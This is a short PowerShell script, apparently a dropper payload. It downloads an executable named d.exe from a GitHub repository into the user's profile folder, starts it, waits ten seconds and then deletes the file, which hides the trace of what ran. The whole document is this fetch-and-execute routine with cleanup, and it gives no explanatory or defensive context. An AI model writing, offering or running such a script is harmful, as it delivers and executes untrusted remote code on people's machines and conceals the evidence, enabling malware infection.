iwr https://github.com/skekic16/lol/raw/main/d.exe?dl=1 -O $Env:USERPROFILE\d.exe
Start-process "$env:USERPROFILE\d.exe"
Start-sleep 10
rm "$env:USERPROFILE\d.exe"
